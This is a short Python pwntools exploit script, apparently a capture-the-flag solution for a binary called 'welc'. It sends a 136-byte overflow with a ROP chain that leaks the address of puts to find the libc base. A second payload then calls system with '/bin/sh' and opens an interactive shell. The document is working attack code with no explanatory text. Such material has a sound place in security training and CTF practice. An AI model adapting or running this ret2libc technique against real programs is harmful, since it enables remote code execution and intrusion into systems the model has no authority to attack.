#!/usr/bin/env python3

from pwn import *
from subprocess import check_output

exe = ELF('welc_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)

cmd=f'''
b* main+67
'''


def GDB():
    if args.DOCKER:
        gdb.attach(pid, exe=exe.path, 
            gdbscript=f"set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe\n" + cmd)
        pause()
    else:
        gdb.attach(p, gdbscript = cmd)
        input()


if args.REMOTE:
    p = remote('')
elif args.DOCKER:
    p = remote('')
    sleep(2)
else:
    p = process([exe.path])

rsi_r15 = 0x0000000000401281
rdi = 0x401283
# GDB()
p.send(b'A'*136 + p64(rdi) + p64(exe.got.puts) + p64(exe.plt.puts) +  p64(exe.sym.main))
p.recvline()
libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - libc.sym.puts
info('Libc base: ' + hex(libc.address))
p.send(b'A'*136 + p64(rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(rdi+1) + p64(libc.sym.system))
p.interactive()
